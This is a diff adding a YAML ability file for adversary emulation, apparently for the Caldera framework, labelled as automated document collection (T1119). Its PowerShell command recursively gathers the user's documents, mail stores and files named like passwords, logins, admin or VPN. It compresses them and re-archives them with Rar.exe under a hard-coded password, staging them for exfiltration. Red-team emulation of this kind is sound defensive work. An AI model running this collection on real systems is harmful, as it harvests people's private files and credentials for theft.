@@ -1,0 +1,17 @@
+---
+- id: 08e57385-dbce-4850-8bb7-589ef79465ab
+  name: 9.B.1 - Automated document collection (T1119)
+  description: Execute PowerShell collection command to collect and compress files of specific extensions.
+  tactic: execution
+  technique:
+    attack_id: T1086
+    name: PowerShell 
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          move-item Rar.exe -Destination C:\Windows\Temp -Force;
+          $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force;
+          cd C:\Windows\Temp;
+          .\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip";
+        payload: rar.exe
